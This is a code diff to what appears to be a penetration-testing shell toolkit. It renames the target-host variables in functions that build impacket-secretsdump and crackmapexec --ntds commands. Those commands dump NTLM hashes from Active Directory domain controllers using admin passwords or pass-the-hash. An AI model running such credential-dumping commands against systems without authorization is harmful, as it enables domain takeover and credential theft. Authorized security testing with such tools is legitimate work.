@@ -49,7 +49,7 @@ nb-ad-dump-secrets() {
     nb-vars-set-domain
     nb-vars-set-user
 
-    __ask "Provide target machine IP"
+    __ask "Provide target host IP"
     nb-vars-set-rhost
     echo
 
@@ -77,7 +77,7 @@ nb-ad-dump-ntds() {
     nb-vars-set-domain
 
     __ask "Provide IP of domain controller"
-    nb-vars-set-rhost
+    nb-vars-set-dchost
 
     __ask "Provide domain admin username"
     nb-vars-set-user
@@ -90,12 +90,12 @@ nb-ad-dump-ntds() {
         echo
         __ask "Enter a domain admin password for authentication"
         nb-vars-set-pass
-        print -z "impacket-secretsdump ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} -just-dc-ntlm | tee ${__domainpath}/NTDS-hashdump.txt"
+        print -z "impacket-secretsdump ${__DOMAIN}/${__USER}:"${__PASS}"@${__DCHOST} -just-dc-ntlm | tee ${__dcpath}/NTDS-hashdump.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the domain admin NTLM hash for authentication"
         nb-vars-set-pass
-        print -z "impacket-secretsdump ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee ${__domainpath}/NTDS-hashdump.txt"
+        print -z "impacket-secretsdump ${__USER}@${__DCHOST} -hashes ${__HASH} -just-dc-ntlm | tee ${__dcpath}/NTDS-hashdump.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -106,7 +106,7 @@ nb-ad-dump-cme-ntds() {
     __check-project
 
     __ask "Provide IP of domain controller"
-    nb-vars-set-rhost
+    nb-vars-set-dchost
 
     __ask "Provide domain admin username"
     nb-vars-set-user
@@ -123,17 +123,17 @@ nb-ad-dump-cme-ntds() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --ntds | tee ${__domainpath}/NTDS-hashdump.txt"
+            print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --ntds | tee ${__dcpath}/NTDS-hashdump.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --ntds | tee ${__domainpath}/NTDS-hashdump.txt"
+            print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -p '${__PASS}' --ntds | tee ${__dcpath}/NTDS-hashdump.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the domain admin NTLM hash for authentication"
         nb-vars-set-pass
-        print -z "impacket-secretsdump ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee ${__domainpath}/NTDS-hashdump.txt"
+        print -z "impacket-secretsdump ${__USER}@${__DCHOST} -hashes ${__HASH} -just-dc-ntlm | tee ${__dcpath}/NTDS-hashdump.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
